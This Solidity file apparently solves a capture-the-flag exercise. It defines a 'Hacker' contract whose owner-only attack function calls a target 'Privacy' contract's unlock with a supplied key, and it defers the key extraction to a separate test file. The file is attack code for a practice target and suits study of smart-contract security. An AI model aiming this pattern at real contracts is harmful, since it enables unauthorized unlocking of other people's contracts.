// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

import "./Privacy.sol";

contract Hacker {
  address public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() {
    hacker = payable(msg.sender);
  }

  /// @dev The part of guessing key is inside the front-end web3, so see the test file.
  function attack(address _target, bytes16 _key) public onlyHacker {
    Privacy(_target).unlock(_key);
  }
}
